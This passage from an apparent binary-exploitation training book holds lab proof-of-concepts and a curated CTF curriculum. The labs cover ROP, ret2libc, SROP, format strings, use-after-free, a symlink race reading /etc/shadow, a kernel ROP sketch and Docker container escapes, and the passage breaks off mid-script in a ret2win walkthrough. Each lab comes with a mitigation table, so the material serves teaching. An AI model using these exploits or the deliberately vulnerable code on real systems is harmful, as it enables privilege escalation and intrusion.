# exploit_rop_puts.py
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)
io  = process("./vuln")

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret     = rop.find_gadget(["ret"]).address

offset  = 64 + 8
payload = b"A"*offset
payload += p64(pop_rdi) + p64(elf.symbols["message"])
payload += p64(ret)                            # alignment
payload += p64(elf.symbols["puts"])
payload += p64(elf.symbols["main"])            # restart for chaining

io.sendlineafter(b"> ", payload)
io.interactive()
```

The stack drives execution: `pop rdi ; ret` consumes `&message`, `ret` consumes the alignment slot, then `ret` consumes the address of `puts`. After `puts` returns, control reaches `main` again — useful for two-phase chains.

#### 20.4 PoC 3 — ret2libc With ASLR (Two-Phase Leak)

Turn ASLR back on:

```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Recompile *without* `win`. Now the chain has to find libc dynamically.

**Phase 1**: leak a libc address by calling `puts(got["puts"])`, then return to `main`.
**Phase 2**: with libc base computed, build `system("/bin/sh")`.

```python
# exploit_ret2libc.py
from pwn import *

elf  = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")    # adjust to your distro
io   = process("./vuln")

rop      = ROP(elf)
pop_rdi  = rop.find_gadget(["pop rdi", "ret"]).address
ret      = rop.find_gadget(["ret"]).address

offset = 64 + 8

# --- Phase 1: leak puts ---
payload  = b"A"*offset
payload += p64(pop_rdi) + p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])               # restart for phase 2

io.sendlineafter(b"> ", payload)
leaked    = io.recvline().strip().ljust(8, b"\x00")
puts_addr = u64(leaked)
log.info(f"puts @ {hex(puts_addr)}")

libc.address = puts_addr - libc.symbols["puts"]
log.info(f"libc base @ {hex(libc.address)}")

# --- Phase 2: system("/bin/sh") ---
binsh = next(libc.search(b"/bin/sh"))

payload  = b"A"*offset
payload += p64(ret)                               # stack alignment
payload += p64(pop_rdi) + p64(binsh)
payload += p64(libc.symbols["system"])

io.sendlineafter(b"> ", payload)
io.interactive()
```

This is the canonical CTF-style ret2libc — full two-phase. Read each line until the flow is obvious, then re-derive it on a different challenge without looking.

#### 20.5 PoC 4 — ret2syscall (Pure Syscall Chain)

If libc is stripped of `system` (some embedded targets do this), build `execve` directly with a syscall.

x86-64 syscall convention: `rax`=syscall number, args in `rdi, rsi, rdx, r10, r8, r9`. `execve` is syscall 59.

```bash
ROPgadget --binary ./vuln | grep -E "pop rax|pop rdi|pop rsi|pop rdx|: syscall"
```

If your binary doesn't have a `syscall` gadget, link statically (`gcc -static ...`) — the gadget pool grows enormously.

```python
# exploit_ret2syscall.py
from pwn import *

elf = ELF("./vuln")           # build with -static for this exercise
io  = process("./vuln")
rop = ROP(elf)

pop_rax = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
syscall = rop.find_gadget(["syscall", "ret"]).address

binsh_addr = elf.bss(0x100)   # writable, known address (no PIE)

# step 1: read(0, binsh_addr, 8)  — write "/bin/sh\0" into bss
chain  = b"A"*(64+8)
chain += p64(pop_rax) + p64(0)         # syscall 0 = read
chain += p64(pop_rdi) + p64(0)         # fd = stdin
chain += p64(pop_rsi) + p64(binsh_addr)
chain += p64(pop_rdx) + p64(8)
chain += p64(syscall)

# step 2: execve(binsh_addr, 0, 0)
chain += p64(pop_rax) + p64(59)        # syscall 59 = execve
chain += p64(pop_rdi) + p64(binsh_addr)
chain += p64(pop_rsi) + p64(0)
chain += p64(pop_rdx) + p64(0)
chain += p64(syscall)

io.sendlineafter(b"> ", chain)
io.send(b"/bin/sh\x00")
io.interactive()
```

Each gadget either loads a register or executes a syscall; the stack drives everything. This is ROP at its purest.

#### 20.6 PoC 5 — SROP

Sigreturn-oriented programming. With one syscall (`sigreturn`, number 15), the kernel restores every register from a sigframe lying on the stack. `pwntools` builds the frame for you.

```python
# exploit_srop.py
from pwn import *

context.arch = "amd64"

elf = ELF("./vuln")           # again, -static for clean gadget pool
io  = process("./vuln")
rop = ROP(elf)

pop_rax = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
syscall = rop.find_gadget(["syscall", "ret"]).address

binsh_addr = elf.bss(0x200)

# stage 1: read "/bin/sh\0" into bss (small ret2syscall as before)
chain  = b"A"*(64+8)
chain += p64(pop_rax) + p64(0)
chain += p64(pop_rdi) + p64(0)
chain += p64(pop_rsi) + p64(binsh_addr)
chain += p64(pop_rdx) + p64(8)
chain += p64(syscall)

# stage 2: sigreturn into a frame that does execve(binsh_addr, 0, 0)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

chain += p64(pop_rax) + p64(15)        # rax = 15 (sigreturn)
chain += p64(syscall)                  # triggers sigreturn
chain += bytes(frame)                  # frame becomes the next "state"

io.sendlineafter(b"> ", chain)
io.send(b"/bin/sh\x00")
io.interactive()
```

The kernel reads the sigframe, restores every register including `rip` (pointing at `syscall ; ret`), and `rax/rdi/rsi/rdx` are already loaded. Result: `execve("/bin/sh", 0, 0)` runs. One sigreturn replaces five separate gadgets.

#### 20.7 Stack Pivot Drill

Modify `vulnerable` to read only 80 bytes — not enough room for a full chain on the stack.

```c
read(0, buf, 80);   // tight: only 16 bytes past saved rbp
```

Strategy:

1. drop the real chain into BSS via a small bootstrap `read`
2. pivot `rsp` to BSS using `xchg rsp, rax ; ret` (or `mov rsp, rax ; ret`)
3. let the chain run from BSS

Sketch:

```python
read_to_bss = ROP(elf)
read_to_bss.read(0, elf.bss(0x300), 0x200)

stage1  = b"A"*(64+8)
stage1 += read_to_bss.chain()
stage1 += p64(pop_rax) + p64(elf.bss(0x300))
stage1 += p64(xchg_rsp_rax)

stage2  = full_ret2libc_chain()        # built like PoC 3

io.sendlineafter(b"> ", stage1)
io.send(stage2)
io.interactive()
```

This pattern — small bootstrap on the stack → big chain in writable memory — is how real-world exploits handle tight overflows.

#### 20.8 Where To Practice More

Self-paced curricula in increasing difficulty:

- **ROP Emporium** (ropemporium.com) — ten levels covering exactly this progression plus `badchars`, `fluff`, `pivot`, and `ret2csu`. The cleanest introduction.
- **pwn.college** Module 6 (Memory Errors) and Module 8 (Binary Exploitation) — the most thorough public curriculum.
- **pwnable.tw**, **pwnable.kr** — classic challenge sets, including BROP-style and SROP challenges.
- **HackTheBox Pwn track** — applied challenges.
- **exploit.education** (Phoenix, Nebula, Protostar) — older, gentler progressions.
- **OST2 (Open Security Training 2)** — long-form courses including ROP.

Run each PoC once. Then modify it, break it deliberately, fix it. Muscle memory matters more than the source code.

#### 20.9 Recompile With Modern Hardening And Watch The PoCs Die

After running the PoCs, recompile the same source with full hardening:

```bash
gcc -fstack-protector-strong -fpie -pie \
    -Wl,-z,now -Wl,-z,relro \
    -fcf-protection=full \
    -O2 vuln.c -o vuln_hardened
```

Now most of the PoCs above stop working:

| PoC                | Defeated by                                        |
| ---                | ---                                                |
| ret2win            | PIE — you cannot address `win` without a leak      |
| ret2libc one-shot  | PIE + canary — linear overwrite blocked            |
| Two-phase ret2libc | Still works *if* you have a separate leak primitive |
| ret2plt / dlresolve | Full RELRO closes the GOT                         |
| Pure ROP           | IBT (`-fcf-protection`) blocks unaligned gadget entries |
| SROP               | Still works on user code; CET shadow stack on supporting hardware breaks it |

Walking through which mitigation defeats which PoC is more valuable than any one exploit. That table is the case for the flags.

#### 20.10 Why These PoCs Stay Educational

Every PoC above:

- runs against a program *you wrote*, with mitigations *you turned off*
- demonstrates a textbook technique on a textbook target
- breaks the moment the target is built like real production software

This is the same shape of exercise found in pwn.college, ROP Emporium, every university security course, and every reputable CTF training program. The skill transfers to authorized engagements and to reading exploit writeups; the specific PoC code does not transfer to attacking real systems, by design.

If you find yourself wanting to point one of these at something you do not own, stop and re-read Part 34.

## Part 49: Cross-Class PoC Workbook

**Level: Advanced (lab exercises).** Part 48 covered ROP-family PoCs. This Part fills in the rest: format strings, heap use-after-free, tcache poisoning, races, kernel modules, and container escapes. Each PoC follows the same lab pattern — vulnerable program you compile yourself, an exploit script, and a mitigation table showing what would defeat it on a hardened target.

These are the standard exercises in any pwn-CTF curriculum. They teach the *technique*; they do not work on hardened production software, by design.

### 1. Format String Lab

Vulnerable program:

```c
// fmt.c — deliberately vulnerable.
#include <stdio.h>
#include <unistd.h>

int authorized = 0;

int main(void) {
    char buf[256];
    setvbuf(stdout, NULL, 0, _IONBF);

    while (1) {
        printf("> ");
        if (!fgets(buf, sizeof(buf), stdin)) break;
        printf(buf);                          // bug: user input as format string
        if (authorized) {
            printf("authorized = 1\n");
            execve("/bin/sh", NULL, NULL);
        }
    }
}
```

Compile:

```bash
gcc -fno-stack-protector -no-pie -O0 fmt.c -o fmt
```

PoC step 1 — leak via `%p`:

```python
from pwn import *

io = process("./fmt")
io.sendlineafter(b"> ", b"AAAA " + b"%p " * 12)
print(io.recvline())                          # observe stack contents
```

You will see your `AAAA` (`0x41414141`) appear among the leaked pointers, telling you which `%N$p` index reaches your input.

PoC step 2 — flip `authorized` via `%n`:

```python
from pwn import *

elf = ELF("./fmt")
io  = process("./fmt")

# pwntools handles the field-width math; index 6 from step 1
payload = fmtstr_payload(6, {elf.symbols["authorized"]: 1})
io.sendlineafter(b"> ", payload)
io.interactive()
```

| Mitigation | Effect |
| --- | --- |
| `-Wformat-security` (compile warning) | catches at build time |
| `_FORTIFY_SOURCE=2` | runtime rejects `%n` to writable memory |
| The fix | `printf("%s", user_input)` — never user input as the format |

### 2. Heap Use-After-Free Lab

```c
// uaf.c — deliberately vulnerable.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct user {
    void (*say_hi)(struct user*);
    char name[24];
} user_t;

void greet(user_t* u) { printf("hi %s\n", u->name); }
void win(user_t* u)   { system("/bin/sh"); }

int main(void) {
    setvbuf(stdout, NULL, 0, _IONBF);

    user_t* u = malloc(sizeof(user_t));
    u->say_hi = greet;
    strcpy(u->name, "alice");

    free(u);                                    // bug: still using u after free

    char* buf = malloc(sizeof(user_t));         // tcache reuses u's chunk
    fread(buf, sizeof(user_t), 1, stdin);       // attacker-controlled

    u->say_hi(u);                               // calls attacker-chosen address
    return 0;
}
```

Compile:

```bash
gcc -fno-stack-protector -no-pie -O0 uaf.c -o uaf
```

PoC:

```python
from pwn import *

elf = ELF("./uaf")
io  = process("./uaf")

payload  = p64(elf.symbols["win"]) + b"A" * 24
io.send(payload)
io.interactive()
```

The freed chunk is reallocated to `buf`. Writing the address of `win` into the first 8 bytes overwrites the slot that used to hold `u->say_hi`. The dangling call jumps there.

| Mitigation | Effect |
| --- | --- |
| AddressSanitizer (ASan) | catches the UAF immediately at runtime |
| Quarantine allocators (e.g., scudo, hardened_malloc) | freed chunks are not reused for a long time |
| Type-segregated allocators | breaks reuse across object types |
| Use-after-free clearing (`-ftrivial-auto-var-init=zero`) | partial mitigation for variables, not heap |

### 3. Tcache Poisoning Lab (Sketch)

Tcache poisoning is the modern heap technique. Glibc 2.32+ added *safe-linking* (XOR of the next pointer with `addr >> 12`) which complicates the math, so the cleanest way to learn this is by working through a tested reference rather than reproducing the full primitive here.

The canonical reference: **how2heap** (`github.com/shellphish/how2heap`). It contains *minimal, glibc-version-tagged* working programs for every heap technique:

- `tcache_poisoning.c`
- `fastbin_dup.c`, `fastbin_dup_into_stack.c`
- `unsorted_bin_attack.c`
- `house_of_force.c`, `house_of_spirit.c`, `house_of_orange.c`, `house_of_botcake.c`
- `large_bin_attack.c`
- `safe_linking.c` (demonstrates how to bypass the modern mitigation given a heap leak)

For learning, the workflow is:

1. install glibc 2.31, 2.32, 2.34 in side-by-side sysroots (the `pwninit` and `glibc-all-in-one` projects help)
2. compile each how2heap example against each glibc version
3. observe which techniques work where, and read the safe-linking PR in glibc to understand why

| Mitigation | Effect |
| --- | --- |
| Safe-linking (glibc 2.32+) | requires a heap leak to compute the XOR mask |
| Tcache key (glibc 2.29+) | detects double-free into tcache |
| `MALLOC_CHECK_=3` | extra integrity checks at runtime |
| `mimalloc-secure` / `scudo` / `hardened_malloc` | replace ptmalloc entirely with a hardened allocator |

### 4. TOCTOU Race Lab

```c
// race.c — TOCTOU on file owner check.
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char** argv) {
    if (argc != 2) return 1;

    struct stat st;
    if (stat(argv[1], &st) != 0) return 1;        // (1) check
    if (st.st_uid != getuid()) {
        puts("not your file");
        return 1;
    }

    int fd = open(argv[1], O_RDONLY);             // (2) use — same path, different file possible
    char buf[4096];
    ssize_t n = read(fd, buf, sizeof(buf));
    write(1, buf, n);
    return 0;
}
```

Compile setuid (in a lab VM you can throw away):

```bash
gcc race.c -o race
sudo chown root:root race
sudo chmod 4755 race                              # setuid
```

PoC:

```bash
# attacker harness — flip the symlink between check and use
echo "my data" > mine.txt
ln -sf mine.txt link

# in one terminal: flip the symlink target rapidly
( while :; do ln -sfn mine.txt link; ln -sfn /etc/shadow link; done ) &

# in another: race the binary repeatedly
while :; do ./race link 2>/dev/null | grep -q root && echo HIT && break; done
```

Eventually `stat()` saw `mine.txt` (owned by you) but `open()` saw `/etc/shadow` (owned by root). The setuid binary reads it for you.

| Mitigation | Effect |
| --- | --- |
| `openat(AT_FDCWD, ..., O_NOFOLLOW)` | refuses symlinks |
| `fstat(fd, ...)` after `open` | check the *opened* file, not the path |
| `O_PATH` + `fstatat` | atomic check-then-use |
| `fs.protected_symlinks=1` | kernel-level symlink restrictions |
| Drop the setuid bit | kill the privilege boundary entirely |

### 5. Kernel Module Lab (Pointers, Not Full Exploit)

Kernel pwn is an entire sub-curriculum. Rather than reproduce a full kernel exploit here, this section gives you the lab skeleton and points to the standard tutorial repos that walk through it end to end.

The lab kernel module:

```c
// vuln_mod.c — deliberately vulnerable kernel module.
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>

#define VULN_IOCTL_OVERFLOW _IOW('V', 1, char *)

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    char kbuf[16];
    switch (cmd) {
    case VULN_IOCTL_OVERFLOW:
        // bug: trusts user-provided length implicitly
        if (copy_from_user(kbuf, (void __user *)arg, 1024))
            return -EFAULT;
        break;
    }
    return 0;
}

static const struct file_operations vuln_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = vuln_ioctl,
};

static struct miscdevice vuln_dev = {
    MISC_DYNAMIC_MINOR, "vuln", &vuln_fops,
};

static int __init vuln_init(void) { return misc_register(&vuln_dev); }
static void __exit vuln_exit(void) { misc_deregister(&vuln_dev); }

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
```

Build against your lab kernel headers, load with `insmod`, and confirm `/dev/vuln` exists.

The lab kernel command line should disable mitigations for a clean first lap:

```text
nokaslr nopti nosmep nosmap pti=off
```

The exploit shape (sketch — fill in offsets from your specific lab kernel):

```c
// exploit.c — userspace driver against vuln_mod in a lab kernel.
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <unistd.h>

// addresses obtained from /proc/kallsyms in your lab kernel (KASLR off)
uint64_t COMMIT_CREDS;
uint64_t PREPARE_KERNEL_CRED;
uint64_t POP_RDI_RET;
uint64_t SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;

int main(void) {
    int fd = open("/dev/vuln", O_RDWR);

    uint64_t payload[128];
    int i = 0;
    // padding to reach saved RIP
    for (; i < 10; i++) payload[i] = 0xdeadbeef;
    // ROP: commit_creds(prepare_kernel_cred(0))
    payload[i++] = POP_RDI_RET;
    payload[i++] = 0;
    payload[i++] = PREPARE_KERNEL_CRED;
    // mov rdi, rax ; call commit_creds — left as exercise
    // then return to userspace via swapgs_restore_regs_and_return_to_usermode

    ioctl(fd, _IOW('V', 1, char *), payload);
    if (getuid() == 0) system("/bin/sh");
    return 0;
}
```

The full chain (function pointer fix-ups, the iretq frame, signal-handler-restore trick, KASLR leak via `/proc/kallsyms` or speculative side channel) is documented in well-known public tutorials. Follow them in this order:

- **xairy/linux-kernel-exploitation** (GitHub) — written-out lab kernels and exploits, mitigations toggled one at a time
- **pwn.college Module 9** (Kernel Security) — the cleanest curriculum
- **midas's "Linux Kernel Exploitation"** series (blog) — modern techniques (`msg_msg`, pipe primitives, BPF tricks)
- **lkmidas/Linux-Kernel-Exploitation-Tutorial** (GitHub)
- **a13xp0p0v's "Linux kernel defense map"** — the dual reference that shows which mitigation defeats which technique

Once you have the basic chain working, re-enable mitigations one at a time (`smep`, then `smap`, then `pti`, then `kaslr`) and watch each one break the exploit. That progression is the *whole point* of the kernel pwn lab.

### 6. Container Escape Lab — Privileged Misconfiguration

```yaml
# docker-compose.yml — deliberately misconfigured.
services:
  vulnerable:
    image: ubuntu:22.04
    command: sleep infinity
    privileged: true                              # bug
    volumes:
      - /:/host                                   # additional bug
```

PoC:

```bash
docker compose up -d
docker compose exec vulnerable bash

# inside the container, the host filesystem is mounted:
ls /host
chroot /host /bin/bash
# you are now operating as root in the host filesystem
```

| Mitigation | Effect |
| --- | --- |
| Drop `privileged: true` | restores capability filtering |
| Don't mount host paths | obvious |
| `securityContext.runAsNonRoot: true` | container UID is not 0 |
| `readOnlyRootFilesystem: true` | container cannot write its own filesystem |
| `securityContext.capabilities.drop: [ALL]` | minimal cap set |
| User namespaces | container UID 0 != host UID 0 |
| Default seccomp profile | blocks dangerous syscalls |
| AppArmor / SELinux profile | extra MAC layer |

### 7. Container Escape Lab — Docker Socket

```yaml
# another classic anti-pattern
services:
  builder:
    image: docker:cli
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock # bug
```

PoC:

```bash
docker compose exec builder sh

# inside, talk to the host Docker daemon:
docker run -v /:/host --rm -it ubuntu chroot /host /bin/bash
# now in a new privileged container with host /:
```

The container runs as root inside, mounts the host root, and chroots in. Game over.

| Mitigation | Effect |
| --- | --- |
| Don't mount the Docker socket | the only real fix |
| Use rootless Docker / Podman | the daemon does not have root anyway |
| Use a Docker API proxy with a restricted policy | mediate access if you must mount |

### 8. Container Escape Lab — Capability `CAP_SYS_MODULE`

```yaml
services:
  bad-cap:
    image: ubuntu:22.04
    command: sleep infinity
    cap_add:
      - SYS_MODULE                                # bug
```

PoC sketch:

```bash
docker compose exec bad-cap bash
# inside, build a tiny kernel module that runs an attacker command,
# then insmod it. The module runs in *host* kernel context and has full root.
```

This is the simplest example of why specific capabilities are effectively root. Cornela's audit (Part 15) flags `CAP_SYS_MODULE` containers explicitly for this reason.

| Mitigation | Effect |
| --- | --- |
| `kernel.modules_disabled=1` after boot | host kernel refuses to load any new module |
| Don't grant `CAP_SYS_MODULE` | usually unnecessary in application containers |
| Module signing + secure boot | unsigned modules refused |

### 9. Putting The Workbook Together

Each PoC above demonstrates one bug class. The educational arc is:

1. run the PoC and confirm it works on your lab
2. enable one mitigation, watch it fail (or watch a more sophisticated technique still succeed)
3. read the public technique that defeats *that* mitigation
4. re-enable everything and notice what is still possible — usually nothing without a real bug

That arc — bug → primitive → mitigation → bypass → more mitigation — is the whole story of binary exploitation in one repeatable workflow.

The next Part lists external CTF challenges that practice each of these techniques against curated targets.

## Part 50: Curated CTF Curriculum

**Level: All levels.** A practice index. Each technique covered in this book maps to specific public CTF challenges, training platforms, and progression resources. Use this Part as a syllabus.

A reminder from Part 31.9: skill in this domain compounds with consistent, low-volume practice. One challenge a week beats a two-week binge.

### 1. Beginner On-Ramp (Pick One, Finish It)

You only need *one* of these to start. Don't sample several.

- **picoCTF** (picoctf.org) — the canonical beginner CTF; year-round practice; gentle ramp.
- **OverTheWire** (overthewire.org):
  - **bandit** — Linux command line basics, 37 levels (start here if absolute beginner)
  - **leviathan** — easy reversing
  - **narnia** — beginner binary exploitation
  - **behemoth** — slightly harder binary exploitation
  - **utumno** — advanced binary exploitation
- **pwn.college** (pwn.college) — university-grade curriculum, free, the most thorough public option. Module ordering matches this book closely.
- **TryHackMe** (tryhackme.com) "Complete Beginner" path — guided rooms with hints.

### 2. Linux Foundations (Maps To Part 0, Part 3)

- **OverTheWire bandit** — non-negotiable if you are new to Linux
- **Linux Journey** (linuxjourney.com) — free Linux fundamentals
- **TryHackMe** Linux Fundamentals 1/2/3
- **HackTheBox** Starting Point — Tier 0 / 1

### 3. Stack Overflow & Basic ROP (Maps To Part 28.6, Part 48, Part 49)

- **ROP Emporium** (ropemporium.com) — ten levels in this exact order: ret2win, split, callme, write4, badchars, fluff, pivot, ret2csu, plus 32-bit variants. The cleanest standalone curriculum.
- **pwn.college** Module 6: Memory Errors
- **picoCTF**: "buffer overflow 0/1/2/3"
- **HackTheBox** Pwn track: Reg, Restaurant, Ropme

### 4. Format Strings (Maps To Part 28.9, Part 49.1)

- **ROP Emporium**: fluff (uses format string + ROP)
- **pwn.college**: "Memory Errors" includes format-string lessons
- **pwnable.kr** (pwnable.kr): fd, collision, bof, flag, password — early levels
- **picoCTF**: "what's that smell"

### 5. Heap Exploitation (Maps To Part 28.10–12, Part 49.2–3)

- **how2heap** (github.com/shellphish/how2heap) — every heap technique with minimal working code, tagged by glibc version
- **pwnable.tw** (pwnable.tw): hacknote, dubblesort, applestore — classic heap challenges
- **pwn.college** Module 7: Heap
- **HeapLAB** (Azeria Labs / Max Kamper) — paid but the most thorough heap course
- **CTFtime** archives: search past challenges for "heap" tag

### 6. Use-After-Free (Maps To Part 28.13, Part 49.2)

- **pwnable.kr**: uaf
- **pwn.college**: heap module
- **CSAW**, **pwnable.tw**: search "UAF"

### 7. Race Conditions / TOCTOU (Maps To Part 28.14, Part 49.4)

- **pwn.college**: Race Conditions module
- **HackTheBox** machines tagged "race condition"
- **DVWA** TOCTOU lessons (web-side TOCTOU)
- **PortSwigger Web Security Academy** "Race conditions" track — modern web race conditions, gold standard

### 8. Linux Privilege Escalation (Maps To Part 35)

- **TryHackMe** "Linux PrivEsc" room — guided, free
- **TryHackMe** "Linux PrivEsc Arena" — unguided
- **HackTheBox** Linux machines — every box has a privesc step
- **OverTheWire** narnia, behemoth — privesc via binary bugs
- **VulnHub** boxes: lin.security, Mr. Robot, Kioptrix series
- **GTFOBins** (gtfobins.github.io) — reference: how each Unix binary can be abused with sudo/SUID/capabilities

### 9. Kernel Exploitation (Maps To Part 29, Part 49.5)

- **pwn.college** Module 9: Kernel Security — single most important resource
- **xairy/linux-kernel-exploitation** (GitHub) — index of public kernel exploits with writeups
- **midas's Linux kernel pwn series** (midas.cool blog)
- **lkmidas/Linux-Kernel-Exploitation-Tutorial** (GitHub) — full lab walkthroughs
- **kernelctf** (google.github.io/security-research/kernelctf) — Google's running bounty for kernel exploits with public challenge VMs
- **hxp CTF** archives — almost always have one or two kernel challenges

### 10. Reverse Engineering (Cross-References Part 31.7)

- **crackmes.one** — practice binaries, beginner to expert
- **HackTheBox** reversing track
- **pwn.college** Module 4: Reverse Engineering
- **microcorruption** (microcorruption.com) — embedded reversing in browser, free
- **flare-on** (Mandiant, annual) — themed RE challenge each year
- **OST2** courses: x86-64 Assembly, Reverse Engineering Malware

### 11. Web Exploitation

- **PortSwigger Web Security Academy** (portswigger.net/web-security) — free, comprehensive, the gold standard
- **Hacker101** (HackerOne, hacker101.com) — free CTF + courses
- **HackTheBox** web challenges
- **picoCTF** web track
- **OverTheWire**: natas (web)
- **OWASP WebGoat** — local lab

### 12. Container & Kubernetes (Maps To Parts 38–39, Part 49.6–8)

- **Iximiuz Labs** (labs.iximiuz.com) — interactive container/K8s scenarios with browser terminals
- **Kubernetes Goat** (madhuakula.com/kubernetes-goat) — deliberately-vulnerable K8s cluster, multiple scenarios
- **HackTheBox** machines tagged "Docker"
- **TryHackMe** "Docker" room
- **CNCF** capture-the-flag past events (KubeCon CTFs, archived)
- **Bad Pods** (BishopFox/badPods) — catalog of dangerous pod configurations to build labs from

### 13. Cloud Security

- **flAWS** (flaws.cloud) and **flAWS2** (flaws2.cloud) — guided AWS scenarios, free
- **CloudGoat** (rhinosecuritylabs/cloudgoat) — deliberately-vulnerable AWS scenarios
- **TerraGoat** (Bridgecrew) — Terraform IaC vulnerabilities
- **PwnedLabs** (pwnedlabs.io) — paid, modern cloud
- **TryHackMe** cloud rooms (AWS, Azure, GCP)
- **AWS Security Specialty practice exams** — surprisingly useful for misconfig recognition

### 14. Cryptography (Adjacent To Several Chapters)

- **CryptoHack** (cryptohack.org) — gold standard for crypto puzzles
- **CryptoPals** (cryptopals.com) — Matasano cryptography challenges, 8 sets
- **picoCTF** crypto track

### 15. Forensics & Incident Response (Maps To Part 18)

- **HackTheBox** Sherlocks track — DFIR scenarios
- **CyberDefenders** (cyberdefenders.org) — blue-team challenges
- **DFIR.training** — large practice repository
- **Volatility Foundation** practice memory images

### 16. Fuzzing Practice (Maps To Part 43)

- **OSS-Fuzz** continuous integration — submit a harness for an open-source project, learn from real findings
- **fuzzing-survey** (github.com/strongcourage/fuzzing-survey) — overview + practice references
- **AFL++ tutorials** — official repo includes example targets
- **syzkaller** "Linux kernel" tutorial — run it once on a debug kernel

### 17. Live CTFs (Periodic Push)

A live CTF every month sharpens you faster than any lab. Pick small ones first.

- **CTFtime.org** — calendar of all upcoming CTFs and ratings
- Notable annual events worth watching even if you don't compete:
  - **DEF CON CTF** (qualifier and finals)
  - **Google CTF**
  - **Plaid CTF**
  - **0CTF / TCTF**
  - **hxp CTF** — German, very strong pwn focus
  - **N1CTF** — Chinese, often kernel-heavy
  - **HITCON CTF**
  - **CSAW CTF**
- **NahamCon CTF** — beginner-friendly annual event
- Read writeups on **CTFtime.org** even for events you didn't play. Reading 50 writeups teaches you more than playing one CTF.

### 18. Mapping Book Parts To CTF Resources (Quick Index)

A summary you can scan when you have an hour and want to practice something specific:

| You want to practice | Best starting resource |
| --- | --- |
| Linux command line | OverTheWire bandit |
| Stack overflow / ret2win | ROP Emporium ret2win |
| ret2libc | ROP Emporium split, callme |
| Pure ROP / ret2syscall | ROP Emporium write4, ret2csu |
| Stack pivot | ROP Emporium pivot |
| Format string | pwn.college, fluff |
| Heap UAF | pwnable.kr uaf |
| tcache poisoning | how2heap tcache_poisoning.c |
| Other heap (House of …) | how2heap |
| Race condition (binary) | pwn.college races module |
| Race condition (web) | PortSwigger races track |
| Linux privesc | TryHackMe Linux PrivEsc + GTFOBins |
| Kernel exploitation | pwn.college Module 9 + xairy repo |
| Reverse engineering | microcorruption + crackmes.one |
| Web exploitation | PortSwigger Web Security Academy |
| Container escape | Kubernetes Goat + Bad Pods catalog |
| AWS misconfig | flaws.cloud + flaws2.cloud + CloudGoat |
| Crypto puzzles | CryptoHack |
| eBPF tooling | bcc-tools repo + bpftrace one-liner book |
| Fuzzing | AFL++ tutorial + OSS-Fuzz onboarding |
| Forensics | CyberDefenders |
| Live competition | CTFtime.org calendar |

### 19. A 12-Week Self-Paced Plan

For a reader who finishes this book and asks "what now?" — a concrete 12-week plan.

Week 1: OverTheWire bandit (1–25). Linux fundamentals refreshed.
Week 2: ROP Emporium ret2win, split, callme. Reading PoC 1–3 in Part 48 alongside.
Week 3: ROP Emporium write4, badchars, fluff. Cross-reference Part 28.9 (format strings).
Week 4: ROP Emporium pivot, ret2csu. Read Part 48 sections 18–20 again.
Week 5: pwnable.kr fd through bof. Format strings + small heap.
Week 6: how2heap tcache_poisoning + fastbin_dup. Reproduce in your own writeup.
Week 7: TryHackMe Linux PrivEsc room. Map every finding to Part 35.
Week 8: pwn.college Module 9 first half — kernel module loading, basic kernel ROP.
Week 9: pwn.college Module 9 second half — KASLR, SMEP, SMAP, KPTI bypasses (in your lab).
Week 10: Kubernetes Goat first half. Map findings to Part 39 RBAC and Part 38 escapes.
Week 11: Kubernetes Goat second half + flaws.cloud. Cloud and K8s consolidation.
Week 12: Live CTF (whichever is on the CTFtime calendar that weekend). Even if you finish 5%, read every writeup afterward.

After week 12 you will not be a master, but you will have practiced every major technique in this book at least once. From there it is the long game — Part 31.9.

### 20. The Habit That Matters Most

A single sentence from many practitioners that is worth memorizing:

```text
read one writeup a day, write one writeup a month
```

Reading writeups is how you absorb the language. Writing them is how you confirm you actually understood. Combined, they produce expertise on a timescale of years, not decades.

## Part 51: Worked Challenge Solutions

**Level: Advanced (full walkthroughs).** Part 50 listed challenges; this Part *solves* representative ones from each platform so you can see the techniques from earlier chapters running against named public targets. These challenges are designed to be solved and shared — the binaries live on the platforms' download pages, and thousands of public writeups exist for each.

The point of this Part is *not* to give you copy-paste answers. It is to show the connective tissue between technique and challenge: how you decide which technique applies, how you find offsets and gadgets, and how the final exploit reads end-to-end. Once you have read three or four of these carefully, the rest of the platform becomes a self-paced loop.

For each challenge: download the binary from the platform, follow along in `gdb`, and only consult the exploit script when you are stuck.

### 1. ROP Emporium "ret2win" — Stack Overflow + Function Return

**Source**: ropemporium.com, level 1.
**Technique**: plain stack overflow → overwrite saved RIP → jump to `ret2win`.
**Maps to**: Part 48.20.2.

Reconnaissance:

```bash
$ checksec ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
$ nm ret2win | grep ret2win
0000000000400756 T ret2win
$ ./ret2win
ret2win by ROP Emporium
> AAAAAAAAAA...           # crashes if input long enough
```

Find the offset to saved RIP using a cyclic pattern:

```python
from pwn import *

io = process("./ret2win")
io.sendlineafter(b">", cyclic(100))
io.wait()                                 # wait for crash
core = io.corefile
